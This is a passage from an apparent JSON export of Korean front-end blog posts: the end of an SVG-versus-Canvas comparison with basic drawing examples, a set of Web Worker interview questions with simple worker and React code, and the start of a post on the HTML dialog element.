있습니다. 캔버스는 JavaScript에 의존하고 다양한 함수와 구문을 이해해야 하기 때문에 SVG보다 복잡하다고 여겨집니다. 사용자는 캔버스에 그림을 그리기 위해 스타일링, 속성 및 그리기 함수와 같은 개념을 이해해야 합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nSVG는 반면에 Canvas보다 덜 복잡하다고 여겨지지만, 마크업 구조와 구문에 대한 이해가 필요합니다. 예를 들어, SVG 모양을 만들려면 path, line 및 rest와 같은 속성 및 요소에 대한 지식이 필요합니다. 두 기술 간의 또 다른 중요한 차이점은 SVG가 웹 표준에 대해 더 많은 지원을 제공한다는 것이며, Canvas는 접근성 기능에 대한 제한적인 지원을 가지고 있습니다.\n\n요약하면, Canvas와 SVG의 학습 곡선은 사용자의 프로그래밍 지식과 마크업 구조에 따라 결정됩니다. Canvas와 SVG 작업은 더 많은 경험을 가진 사람들에게는 간단할 수 있습니다. 그러나 프로그래밍 경험이 없는 사람들에게는 두 기술의 기초를 배우는 것이 더 많은 노력을 필요로 할 수 있습니다.\n\n# 인기\n\nCanvas와 SVG는 상호작용적인 웹 콘텐츠를 만드는 도구로서 점점 더 인기를 얻고 있습니다. Canvas와 SVG는 모두 공개 표준 웹 그래픽 기술입니다. 두 기술 모두 장단점이 있으므로 어떤 것을 사용할지 결정하기 전에 두 기술 간의 차이를 이해하는 것이 중요합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n대부분의 현대 브라우저에서 캔버스를 지원하며 사용하기 쉽습니다. 캔버스의 주요 장점은 그래픽과 애니메이션을 빠르고 쉽게 생성할 수 있다는 것입니다. 그러나 캔버스는 SVG만큼 유연하지 않고 제한된 애니메이션만 지원합니다.\n\nSVG는 캔버스보다 강력하고 유연하여 세밀하고 복잡한 그래픽을 만들 수 있습니다. SVG는 애니메이션과 상호 작용 요소도 지원하여 복잡하고 인터랙티브한 웹 디자인을 위한 뛰어난 선택지입니다. 또한 SVG는 캔버스보다 접근성이 더 높습니다. 왜냐하면 스크린 리더가 읽을 수 있기 때문입니다.\n\n# SVG와 캔버스의 응용 사례\n\nSVG와 캔버스는 각각 벡터 및 래스터 그래픽을 렌더링하는 HTML5 API입니다. SVG는 벡터 기반 그래픽을 만드는 데 사용되며 캔버스는 벡터 및 래스터 그래픽을 렌더링할 수 있습니다. 캔버스는 SVG보다 그래픽을 빠르게 렌더링하고 제한적인 제어만 가능합니다. SVG의 한 가지 응용 사례는 웹 사이트에서 사용할 대화식 지도 시스템을 만드는 것일 수 있습니다. 벡터 형식이기 때문에 사용자는 지도를 확대 및 축소할 때 픽셀화나 왜곡 없이 볼 수 있습니다. 또한 SVG는 부드러운 애니메이션을 지원하여 지도 상의 움직임을 효과적으로 표현할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n캔버스는 많은 제어력과 유연성을 제공하기 때문에 게임을 렌더링하는 데 사용할 수 있어요. 예를 들어, 캔버스는 게임의 환경, 캐릭터, 그리고 애니메이션을 렌더링하는 데 사용될 수 있어요. 또한 물리 시뮬레이션과 인공지능 계산에도 사용될 수 있어요.\n\nSVG와 캔버스는 웹사이트에 데이터 시각화를 만드는 데도 사용될 수 있어요. SVG는 자세한 차트를 만드는 데 더 좋고, 캔버스는 빠르게 차트를 만들고 더 적은 제어로 만드는 데 더 좋아요.\n\n# SVG와 캔버스를 사용할 때의 권장 사항\n\nSVG와 캔버스는 인터넷 상에서 그래픽을 만들고 그리는 데 사용되는 두 가지 웹 기술이에요. 캔버스는 일반적으로 그래픽, 애니메이션, 게임을 만드는 데 사용되고, SVG는 보다 확장 가능한 벡터 그래픽을 만드는 데 주로 사용돼요. SVG와 캔버스 중 어느 것을 선택할 지 결정할 때 그래픽의 복잡성을 고려하는 것이 중요해요. SVG는 모양과 로고와 같은 간단한 그래픽을 만드는 데 가장 효율적이에요. 또한 다수의 해상도로 확장 가능성을 유지하면서 성능을 향상시킬 수 있는 최상의 선택이에요. 반면에 캔버스는 동적이고 상호작용하는 그래픽에 가장 적합해요. 이는 애니메이션을 만들거나 비디오를 보여주거나 상호작용하는 게임을 개발하는 데 포함돼요. 캔버스는 또한 복잡한 그래픽이나 다수의 객체를 다룰 때 더 효율적이에요. SVG는 간단한 그래픽에 더 적합하고, 캔버스는 복잡하고 동적이며 상호작용적인 그래픽에 더 적합해요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# SVG와 캔버스의 주요 차이점 요약\n\n웹사이트용 그래픽을 만들 때, SVG(Scalable Vector Graphics)와 캔버스(Canvas) 두 가지 인기있는 기술이 있습니다. 이 두 기술 간의 주요 차이점은 SVG가 기하학적 모양을 사용하여 그래픽을 렌더링하는 반면 캔버스는 픽셀을 사용한다는 것입니다. 이는 SVG 그래픽이 해상도에 독립적이어서 품질을 잃지 않고 크기를 조정할 수 있지만, 캔버스 그래픽은 크기를 조정할 때 흐릿하고 왜곡되는 문제가 발생한다는 것을 의미합니다.\n\n또한, SVG는 공식 마크업 언어로 구성되어 복잡한 그래픽을 만드는 것이 더 쉽지만, 캔버스는 더 복잡한 이미지를 그리기 위해 JavaScript 지식이 필요합니다. SVG는 정적 이미지와 애니메이션에 더 적합하며, 캔버스는 게임이나 실시간 응용프로그램과 같은 동적 그래픽을 만드는 데 더 적합합니다. 결론적으로, SVG와 캔버스는 웹사이트에서 그래픽을 만드는 데 사용되는 두 가지 다른 기술이며, SVG는 해상도에 독립적이고 공식 마크업 언어로 구성되어 있으며, 캔버스는 픽셀로 구성되어 JavaScript 지식이 필요합니다. 각 도구에는 장단점이 있으므로 프로젝트의 특정 목표에 따라 선택이 결정될 것입니다.\n\n# SVG에는 어떤 모양이 있나요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nSVG를 통해 다양한 모양을 만들 수 있습니다. 모양을 만드는 방법은 전적으로 여러분에 달려 있어요. SVG는 다음과 같은 모양을 생성하는 데 사용할 수 있습니다:\n\n- 사각형\n- 다각형\n- 텍스트\n- 원\n- 다각선\n- 타원\n- 선\n- 경로\n\n모양의 점 속성을 사용하면 여전히 다른 종류의 모양을 만들 수 있어요. 이 점 속성은 다각형과 함께 사용될 때 완벽하게 작동합니다.\n\n# SVG에 사용할 수 있는 스타일링은 무엇이 있을까요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n이 섹션에서는 도형을 만들 때 SVG를 사용할 때 사용할 수있는 스타일 옵션에 대해 다룰 예정입니다. SVG를 사용하려면 이러한 스타일을 사용해야합니다. SVG는 다음과 같은 여러 방법으로 스타일을 적용할 수 있습니다:\n\n- 스타일 속성\n\n  스타일 속성을 사용하여 SVG 요소에 CSS 스타일을 적용할 수 있습니다. 예를 들어 CSS 속성을 사용하여 채우기 색상, 테두리 색상, 테두리 너비, 불투명도 등을 변경할 수 있습니다.\n\n아래는 코드에서 스타일 속성을 사용하는 방법을 보여주는 그림입니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\n\u003csvg\u003e\n  \u003cpolygon style=\"fill: cornflowerblue; stroke: red; stroke-width: 5\" /\u003e\n\u003c/svg\u003e\n\n\n위 코드에서 스타일 속성 값에 포함된 것들이 다같이  다각형 모양에 적용될 스타일 입니다. 위 SVG 코드에서 사용된 스타일 설명은 아래에서 확인할 수 있습니다.\n\n- fill 속성은 모양의 배경색에만 영향을 미칩니다.\n- SVG에서 만들어질 윤곽선의 색은 stroke 속성을 사용하여 설정됩니다.\n- 윤곽선 너비를 설정하려면 스타일에 stroke-width 속성을 추가하면 됩니다.\n\n# CSS 클래스\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nCSS 클래스를 활용하면 특정 스타일링이 적용된 클래스를 생성하고 해당 클래스를 CSS의 class 속성을 사용하여 SVG 요소에 적용할 수 있습니다.\n\n## Inline CSS\n\nstyle 속성을 사용하여 속성에 직접 스타일을 지정함으로써 인라인 CSS를 사용하여 SVG 요소에 스타일을 적용할 수도 있습니다.\n\n## 프리젠테이션 속성\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nSVG에서 프레젠테이션 속성을 사용하면 요소에 스타일을 직접 적용할 수 있어요. 예를 들어 `rect` 요소는 \"fill\" 속성을 설정하여 채우기 색상을 지정할 수 있어요.\n\n# 외부 스타일시트\n\n`link` 요소를 사용하여 외부 CSS 스타일시트에서 스타일을 정의하고 SVG에 연결할 수 있어요.\n\nSVG는 자주 사용되는 채우기, 외곽선, 선 두께, 불투명도, 변환 등과 같은 스타일링 요소를 사용해요. SVG는 그라데이션, 필터, 마스크와 같이 고급 기능을 사용하여 스타일을 적용할 수도 있어요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# SVG로 모양 만드는 방법\n\nHTML에서 SVG를 생성하는 과정은 몇 줄의 코드만 필요한 간단한 과정입니다. `svg` 요소를 만들고, SVG 그림의 크기를 지정한 다음 `svg` 요소 내에 모양, 텍스트 및 다른 요소를 추가하면 됩니다.\n\n## 정사각형과 직사각형\n\n먼저 `svg` 요소를 만들고, 그림 캔버스의 크기를 지정합니다. 이는 `svg` 요소에 너비와 높이 속성을 추가하여 수행됩니다. 속성 '너비'와 '높이'는 픽셀 단위로 지정됩니다.\n\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n\u003csvg width=\"200\" height=\"200\"\u003e\u003c/svg\u003e\n```\n\n그런 다음 `svg` 요소 내에 모양, 텍스트 및 기타 요소를 추가하세요. 이는 알맞은 모양 및 텍스트 요소를 `svg` 요소 내부에 포함시켜 수행됩니다. 예를 들어 사각형 또는 정사각형을 만들려면 `rect` 요소를 사용하세요:\n\n```js\n\u003csvg width=\"200\" height=\"200\"\u003e\n  \u003crect x=\"10\" y=\"10\" width=\"50\" height=\"50\" /\u003e\n\u003c/svg\u003e\n\n\u003csvg width=\"400\" height=\"110\"\u003e\n  \u003crect\n    width=\"300\"\n    height=\"100\"\n    style=\"fill: rgb(0, 0, 255); stroke-width: 3; stroke: rgb(0, 0, 0)\"\n  /\u003e\n\u003c/svg\u003e\n```\n\n출력:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\u003cimg src=\"/assets/img/2024-05-02-SVGVsCanvasAComparison_1.png\" /\u003e\n\n이 섹션에서는 SVG를 사용하여 다양한 모양을 만들 것입니다. 이 모양들은 매우 쉽고 어렵지 않으니 시작해 봅시다.\n\n## 원\n\n원소는 매우 간단한 원을 만드는 데 사용할 수 있습니다. SVG에서 원에 적용될 속성은 다음과 같습니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- cy: cy 속성은 원의 Y 좌표를 나타냅니다.\n- cx: X 좌표를 설정할 때는 cx 속성을 사용해주세요.\n- stroke: 원의 테두리 색상을 변경하려면 stroke 속성을 사용하세요.\n- stroke-width: stroke-width 속성을 사용하여 원의 테두리 너비를 지정할 수 있습니다.\n\nSVG를 사용하여 원을 그려봅시다:\n\n`![SVGVsCanvasAComparison_2](/assets/img/2024-05-02-SVGVsCanvasAComparison_2.png)`\n\n코드:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n\u003csvg height=\"100\" width=\"100\"\u003e\n  \u003ccircle\n    cx=\"50\"\n    cy=\"50\"\n    r=\"40\"\n    stroke=\"cornflowerblue\"\n    stroke-width=\"3\"\n    fill=\"gray\"\n  /\u003e\n\u003c/svg\u003e\n```\n\n## Polygon\n\n단순히 SVG의 `polygon` 요소를 사용하여 다각형을 만들 수 있습니다. SVG 다각형 요소를 사용하여 다각형 모양을 만들 수 있습니다.\n\n다각형을 생성해 봅시다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\u003cimg src=\"/assets/img/2024-05-02-SVGVsCanvasAComparison_3.png\" /\u003e\n\n코드:\n\n```js\n\u003csvg height=\"250\" width=\"500\"\u003e\n  \u003cpolygon\n    points=\"220,10 300,210 170,250 123,234\"\n    style=\"fill: cornflowerblue; stroke: red; stroke-width: 4\"\n  /\u003e\n\u003c/svg\u003e\n```\n\n상기 코드에서 `polygon` 요소는 `svg` 요소 내부에서 사용되었습니다. 그리고 우리는 다각형 요소 내부의 점 속성을 활용했습니다. 다각형 모양의 x와 y 좌표는 point 속성에 의해 지정됩니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n`polygon` 요소를 사용하여 각 코너의 x 및 y 좌표를 설정하는 points 속성을 사용하여, 빠르게 별을 생성할 수 있습니다.\n\n![Star Shape](/assets/img/2024-05-02-SVGVsCanvasAComparison_4.png)\n\n코드:\n\n```js\n\u003csvg height=\"210\" width=\"500\"\u003e\n  \u003cpolygon\n    points=\"100,10 40,198 190,78 10,78 160,198\"\n    style=\"\n      fill: cornflowerblue;\n      stroke: red;\n      stroke-width: 5;\n      fill-rule: nonzero;\n    \"\n  /\u003e\n\u003c/svg\u003e\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 텍스트\n\nSVG를 사용하여 텍스트를 손쉽게 작성할 수 있어요. 그런 사실을 알고 계셨나요? 아주 간단하게 텍스트를 작성할 수 있죠. 그러면 시작해봅시다!\n\n![image not found](/assets/img/2024-05-02-SVGVsCanvasAComparison_5.png)\n\n코드:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n\u003csvg width=\"\"\u003e\n  \u003ctext x=\"100\" y=\"100\" fill=\"cornflowerblue\"\u003eWELCOME TO OPEN REPLAY\u003c/text\u003e\n\u003c/svg\u003e\n```\n\n위 코드에서는 X 및 Y 속성을 사용하여 텍스트를 위치시키고, 텍스트에 cornflowerblue라는 색상을 부여하기 위해 fill 속성을 사용했습니다.\n\n## SVG 이미지\n\n마지막으로 `img` 요소 내에 SVG를 포함시킴으로써 HTML 페이지에 통합할 수 있습니다. SVG 파일의 URL은 `img` 요소의 src 속성에 있어야 합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n\u003cimg src=\"/image.svg\" width=\"500px\" alt=\"\" /\u003e\n```\n\n출력:\n\n\u003cimg src=\"/assets/img/2024-05-02-SVGVsCanvasAComparison_6.png\" /\u003e\n\n위의 단계를 따라 간단히 HTML에서 SVG를 만들 수 있습니다. 더 많은 SVG 이미지를 원하시면 여기를 클릭해주세요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 캔버스를 사용하여 모양 만들기\n\nHTML 캔버스는 꽤 간단하게 만들 수 있어요. HTML5 캔버스 요소는 HTML 파일에 있어야 하며 필요한 속성이 있어야 해요. 먼저 캔버스 요소를 선언하고 높이와 너비를 지정해야 해요. 이를 위해 HTML 문서에 `canvas`라는 올바른 속성이 포함된 요소를 추가하는 걸로 할 수 있어요.\n\n```js\n\u003ccanvas id=\"myCanvas\" width=\"500\" height=\"500\"\u003e\u003c/canvas\u003e\n```\n\n캔버스 요소를 HTML 요소로 추가한 후 상호 작용할 수 있도록 JavaScript 코드가 포함되어 있어야 해요. getContext() 메소드를 사용하여 이 작업을 수행해야 해요. 이렇게 하면 캔버스 드로잉 API에 액세스할 수 있어요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\n바로 캔버스 그리기 API에 접근할 수 있으면 그리기를 시작할 수 있어요. 그리기 API의 메서드를 사용하여 캔버스에 모양, 선, 텍스트 및 그라데이션을 그릴 수 있어요. fillStyle 속성을 사용하면 그려진 모양의 색상을 변경할 수도 있어요.\n\nctx.fillStyle = \"#FF0000\";\nctx.fillRect(20, 20, 150, 100);\n```\n\n출력:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n\u003cimg src=\"/assets/img/2024-05-02-SVGVsCanvasAComparison_7.png\" /\u003e\n\n캔버스 요소가 준비되었고 그림 그리기 API가 활성화되어 있으므로 이제 캔버스 기반 프로젝트를 개발할 수 있습니다.\n\nHTML 캔버스에 대해 더 알고 싶다면 MDN 웹 문서를 방문해보세요.\n\n# 캔버스에서 이미지를 만드는 데 도움이 되는 상위 10개 라이브러리\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n코딩이나 그래픽 디자인 경험이 많이 없는 사람들을 위해 라이브러리는 Canvas에서 이미지를 만들고 조작하는 것을 간단하게 만들어줍니다. 많은 라이브러리의 간단한 API를 사용해 시작하기 쉽습니다. 아래는 Canvas에서 이미지를 만드는 데 도움이 되는 상위 10개 라이브러리입니다:\n\n- Fabric.js는 HTML5 캔버스에서 이미지를 만들고 편집하기 위한 다양한 도구 세트를 제공하는 JavaScript 라이브러리입니다. 간단하고 강력하며 여러 형태, 텍스트, 패턴과 같은 다양한 이미지 구성 요소를 지원합니다.\n- Konva.js는 웹 브라우저 내에서 고성능 대화식 2D 그래픽을 만들기 위해 특별히 설계된 라이브러리입니다. 다양한 이미지 형식을 처리할 수 있고 다양한 그리기 도구와 애니메이션을 제공합니다.\n- D3.js는 데이터 시각화용으로 자주 사용되는 Canvas에서 동적이고 대화식 이미지를 만드는 잘 알려진 라이브러리입니다. 축과 모양과 같은 간단한 요소뿐만 아니라 더 복잡한 이미지를 그릴 수 있습니다.\n- EaselJS는 HTML5 캔버스에서 빠르고 쉬운 이미지 조작을 가능하게 하는 JavaScript 라이브러리입니다. 다양한 기능 중에서 모양, 텍스트, 애니메이션 등이 있습니다.\n- Paper.js는 Canvas에서 복잡하고 대화식 이미지를 생성할 수 있는 벡터 그래픽 라이브러리입니다. 곡선, 경로, 모양 작업을 위한 다양한 도구를 포함하고 있습니다.\n- Snap.svg는 웹 기반 SVG 이미지 조작을 위한 JavaScript 라이브러리입니다. 간단하게 사용할 수 있으며 간단한 벡터 그래픽 조작이 가능합니다.\n- Three.js는 Canvas에서 멋진 3D 이미지를 만들고 높은 상호 작용을 제공하는 3D 그래픽 라이브러리입니다. 재료, 텍스처, 조명 작업을 위한 다양한 도구를 제공합니다.\n- Phaser는 Canvas를 사용하는 HTML5 게임을 만들기 위한 프레임워크입니다. 오디오, 애니메이션, 물리 엔진과 같은 다양한 이미지 관리 도구를 제공합니다.\n- Chart.js는 동적이고 대화식 캔버스 차트를 만들기 위한 인기 있는 라이브러리입니다. 막대, 선, 파이 차트 등 다양한 차트 유형을 제공합니다.\n- Create.js는 웹 사이트를 위한 풍부한 시각 요소와 상호 작용 그래픽 및 애니메이션을 만들기 위해 사용되는 JavaScript 라이브러리들의 모음입니다.\n\n# 결론\n\nSVG와 Canvas의 비교가 재미있었기를 바랍니다. 이 경쟁에서 명확한 우승자는 없습니다. SVG와 Canvas 모두 장단점이 있으며 최적의 옵션은 프로그래밍 배경과 프로젝트의 목표 및 사양에 따라 다를 것입니다. 간단한 그래픽을 만드는 데 SVG를 사용해 왔고 고급 그래픽이나 2D 게임을 만들어 보고 싶다면 Canvas를 시도해 볼 수 있을 것입니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\nhttps://blog.openreplay.com에서 원문이 게시되었습니다.","ogImage":{"url":"/assets/img/2024-05-02-SVGVsCanvasAComparison_0.png"},"coverImage":"/assets/img/2024-05-02-SVGVsCanvasAComparison_0.png","tag":["Tech"],"readingTime":15},{"title":"웹 워커 관련 프론트엔드 면접 질문","description":"","date":"2024-05-02 00:08","slug":"2024-05-02-WebWorkersInterviewQuestions","content":"\n\n주제 안내:\n\n# 웹 워커:\n\n웹 워커는 브라우저 기능의 일부입니다. 현재 페이지의 백그라운드에서 생성될 수 있는 실제 OS 스레드로, 복잡하고 자원 집약적인 작업을 수행할 수 있습니다.\n\n서버에서 대량의 데이터를 가져와야 하거나 UI에 복잡한 렌더링이 필요한 경우를 상상해보세요. 이를 직접 웹페이지에서 처리한다면 페이지가 더 부드럽지 않을 수 있고 UI에 영향을 줄 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n위 웹 워커를 사용하여 이 문제를 완화할 수 있어요. 웹 워커는 웹 워커라 불리는 쓰레드를 만들고, 그 웹 워커가 복잡한 작업을 처리하도록 할 수 있어요.\n\n웹 워커와 간단하게 소통할 수 있으며, 이를 통해 워커와 UI 간에 데이터를 주고받을 수 있어요.\n\n아래는 웹 워커의 주요 기능 몇 가지에요:\n\n- 웹 워커는 쓰레드 기반의 JavaScript입니다.\n- 웹 워커는 더 많은 공간과 CPU 시간을 요구해요.\n- 웹 워커는 웹사이트의 속도를 향상시켜 줘요.\n- 웹 워커는 클라이언트 측에서 코드를 실행해요 (서버 측이 아니에요).\n- 웹 워커 쓰레드는 postMessage() 콜백 메서드를 사용하여 서로 소통해요.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n웹 워커의 일반적인 예시는 다음과 같습니다:\n\n- 주식 가격, 실시간 활성 사용자 등의 실시간 데이터를 표시하는 대시보드 페이지\n- 서버에서 큰 파일을 가져오는 작업\n- 자동 저장 기능\n\n## 웹 워커 생성 구문\n\n```js\n웹 워커 생성을 위해 사용됩니다\nworker = new Worker(\"webWorker.js\");\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 웹 워커 종료하는 구문\n\n```js\n// 웹 워커를 종료하는 데 사용됩니다.\nworker.terminate();\n```\n\n```js\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n  \u003cmeta charset=\"UTF-8\"\u003e\n  \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e\n  \u003ctitle\u003e웹 워커 예제\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n  \u003ch1\u003e웹 워커 예제\u003c/h1\u003e\n  \u003cbutton onclick=\"startWorker()\"\u003e워커 시작\u003c/button\u003e\n  \u003cp id=\"result\"\u003e\u003c/p\u003e\n\n  \u003cscript\u003e\n    function startWorker() {\n      const worker = new Worker('worker.js');\n      \n      worker.onmessage = function(event) {\n        document.getElementById('result').textContent = event.data;\n      };\n    }\n  \u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n```js\nfunction doHeavyTask() {\n  // 무거운 CPU 작업을 시뮬레이션합니다.\n  let result = 0;\n  for (let i = 0; i \u003c 1000000000; i++) {\n    result += i;\n  }\n  return result;\n}\n\n// 메인 스레드로부터 메시지를 수신합니다.\nonmessage = function(event) {\n  const heavyResult = doHeavyTask();\n  postMessage(heavyResult); // 결과를 메인 스레드로 다시 보냅니다.\n};\n```\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## React 예제, WebWorker Websocket 예제\n\n```js\nconst Homepage = () =\u003e {\n  const [worker, setWorker] = useState(null);\n  const [res, setRes] = useState([]);\n  const [log, setLog] = useState([]);\n  const [buttonState, setButtonState] = useState(false);\n\n  const hanldeStartConnection = () =\u003e {\n    // 워커에 메시지 보내기 [postMessage]\n    worker.postMessage({\n      connectionStatus: \"init\",\n    });\n  };\n\n  const handleStopConnection = () =\u003e {\n    worker.postMessage({\n      connectionStatus: \"stop\",\n    });\n  };\n \n //UseEffect1\n  useEffect(() =\u003e {\n    const myWorker = new Worker(\n      new URL(\"../workers/main.worker.js\", import.meta.url)\n    ); //NEW SYNTAX\n    setWorker(myWorker);\n\n    return () =\u003e {\n      myWorker.terminate();\n    };\n  }, []);\n\n //UseEffect2\n  useEffect(() =\u003e {\n    if (worker) {\n      worker.onmessage = function (e) {\n        if (typeof e.data === \"string\") {\n          if(e.data.includes(\"[\")){\n            setLog((preLogs) =\u003e [...preLogs, e.data]);\n          } else {\n            setRes((prevRes) =\u003e [...prevRes, { stockPrice: e.data }]);\n          }\n        }\n\n        if (typeof e.data === \"object\") {\n          setButtonState(e.data.disableStartButton);\n        }\n      };\n    }\n  }, [worker]);\n\n  return (\n    \u003c\u003e\n      \u003cdiv className=\"stats\"\u003e\n        \u003cdiv className=\"control-panel\"\u003e\n          \u003ch3\u003eWebWorker Websocket 예제\u003c/h3\u003e\n          \u003cbutton\n            id=\"start-connection\"\n            onClick={hanldeStartConnection}\n            disabled={!worker || buttonState}\n          \u003e\n            연결 시작\n          \u003c/button\u003e\n          \u0026nbsp;\n          \u003cbutton\n            id=\"stop-connection\"\n            onClick={handleStopConnection}\n            disabled={!buttonState}\n          \u003e\n            연결 중지\n          \u003c/button\u003e\n        \u003c/div\u003e\n        \u003cLineChartComponent data={res} /\u003e\n      \u003c/div\u003e\n      \u003cLogger logs={log}/\u003e\n    \u003c/\u003e\n  );\n};\n```\n\n# 웹 워커의 종류\n\n웹 워커는 웹 페이지의 메인 스레드와 별도로 백그라운드에서 스크립트를 실행하는 방법을 제공합니다. 사용자 인터페이스를 방해하지 않고 작업을 수행할 수 있도록 합니다. 여기에는 두 가지 주요 웹 워커의 종류가 있습니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n## 1. 전용 워커:\n\n- 전용 워커는 생성한 스크립트에 의해서만 접근할 수 있습니다.\n- 메인 스레드와 격리된 자체 스레드에서 실행됩니다.\n- 웹 페이지의 반응성에 영향을 미치지 않으면서 무거운 계산이나 시간이 오래 걸리는 작업을 처리해야 하는 상황에 유용합니다.\n- 전용 워커는 일반적으로 단일 스크립트 내에서 사용됩니다.\n\n## 2. 공유 워커:\n\n- 공유 워커는 동일한 도메인에 속하는 여러 창, 아이프레임 또는 다른 컨텍스트에서 실행 중인 여러 스크립트에서 접근할 수 있습니다.\n- 데이터를 공유하거나 응용 프로그램의 다른 부분 간의 작업을 조정해야 하는 상황에 공유 워커가 설계되었습니다.\n- 서로 다른 탭이나 프레임 간의 통신과 협업을 제공합니다.\n- 공유 워커는 더 다양하며 여러 스크립트가 동시에 활용할 수 있습니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n# 인터뷰 질문:\n\n## 웹 워커(Web Worker)란 무엇인가요?\n\n- 웹 워커(Web Worker)는 웹 애플리케이션의 주 실행 스레드와 별도의 백그라운드 스레드에서 스크립트를 실행할 수 있는 JavaScript 기능입니다.\n\n## 웹 워커(Web Worker)가 해결하는 문제는 무엇인가요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 웹 워커는 웹 애플리케이션의 응답성을 향상시키기 위해 주 스레드에서 작업을 오프로드하는 데 도움이 됩니다. 그들은 UI를 차단하지 않고 동시에 실행을 가능하게 합니다.\n\n## 웹 워커를 어떻게 생성하나요?\n\n- 웹 워커는 주 자바스크립트 코드에서 Worker 개체를 인스턴스화하고 워커 스크립트의 URL을 인수로 제공하여 생성합니다.\n\n## 웹 워커와 주 스레드 간의 통신 메커니즘은 무엇인가요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 웹 워커는 postMessage() 메서드를 사용하여 주 스레드와 통신하고 onmessage 이벤트 핸들러를 통해 메시지를 수신합니다.\n\n### 웹 워커와 주 스레드 간에 전송할 수 있는 데이터 유형은 무엇인가요?\n\n- 전송할 수 있는 데이터 유형에는 JSON 객체, ArrayBuffer, ArrayBufferView, 파일/블롭 객체 및 기타 구조화된 복제 가능한 객체가 포함됩니다.\n\n### 웹 워커의 제한사항은 무엇인가요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 웹 워커는 DOM, window, document와 같은 특정 API에 직접 액세스할 수 없으며 동기 XHR 요청을 수행할 수 없습니다. 또한, 동일 출처 정책으로 인해 다른 출처의 리소스에 액세스하는 데 제한이 있습니다.\n\n**웹 워커를 종료하는 방법은 무엇인가요?**\n\n- 메인 스레드에서 Worker 객체의 terminate() 메서드를 호출하여 웹 워커를 종료할 수 있습니다.\n\n**웹 워커에는 어떤 종류가 있나요?**\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 웹 워커에는 Dedicated Workers와 Shared Workers 두 가지 유형이 있어요. Dedicated Workers는 하나의 스크립트에 특화되어 있지만, Shared Workers는 여러 스크립트에서 공유할 수 있어요.\n\n## 웹 워커의 일반적인 사용 사례는 무엇인가요?\n\n- 웹 워커는 이미지 처리, 오디오/비디오 처리, 데이터 구문 분석 및 암호화/해독과 같은 CPU 집약적 작업에 주로 사용돼요. 또한 서버에서 데이터를 가져오거나 WebSocket을 통해 수신한 데이터를 처리하는 백그라운드 작업에도 사용할 수 있어요.\n\n## 웹 워커에서 오류를 처리하는 방법은 무엇인가요?\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n- 웹 워커 내에서 발생하는 오류는 onerror 이벤트 핸들러를 사용하여 캡처할 수 있습니다. 또한 postMessage()를 사용하여 메시지를 메인 스레드로 보내고 메인 스레드에서 처리할 수 있습니다.\n\n## 참고 문서:\n\n- https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers\n- https://www.freecodecamp.org/news/how-webworkers-work-in-javascript-with-example/","ogImage":{"url":"/assets/img/2024-05-02-WebWorkersInterviewQuestions_0.png"},"coverImage":"/assets/img/2024-05-02-WebWorkersInterviewQuestions_0.png","tag":["Tech"],"readingTime":6},{"title":"HTML \u003cdialog\u003e 요소를 사용한 JavaScript와 React에서의 모달(dialog)","description":"","date":"2024-05-02 00:07","slug":"2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact","content":"\n\n![image](/assets/img/2024-05-02-ModalswithHTMLdialogelementinJavaScriptandReact_0.png)\n\n다이얼로그 태그는 모달과 같은 컴포넌트를 만드는 좋은 방법입니다. 여기에는 구현하는 몇 가지 방법이 있습니다.\n\n일반적으로 `dialog`는 상호 작용 컴포넌트를 만들며, 간단한 대화상자나 모달로 변환할 수 있습니다. 전자는 컴포넌트를 단순히 열고, 후자는 모달이 열려 있는 동안 